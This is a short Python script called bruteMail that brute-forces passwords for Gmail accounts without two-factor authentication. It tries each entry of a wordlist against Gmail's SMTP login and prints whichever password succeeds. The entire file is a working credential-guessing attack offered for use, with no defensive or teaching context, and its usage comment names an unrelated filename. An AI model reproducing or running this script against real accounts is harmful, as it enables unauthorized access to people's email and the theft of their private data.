#!/usr/bin/python

# bruteMail - Bruteforce Gmail account not using 2FA/MFA.
# Author: Ethan Smith
# Usage: python .\wifiPass2file.py
# Python 3

import smtplib
from termcolor import cprint

def brute_mail():
    email = input("Enter Gmail username: ")
    passwd_file_path = input("Enter Gmail password file path: ")
    passwd_file = open(passwd_file_path, 'r')
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
    except:
        cprint("Error: Verify Gmail SMTP settings.", 'red')
        exit()

    for password in passwd_file:
        password = password.strip('\n')
        try:
            server.login(email, password)
            cprint(f"[+] Password found: {password}", 'green')
            break
        except smtplib.SMTPAuthenticationError:
            cprint("[-] Error: Not a valid password.", 'red')
    server.quit()

brute_mail()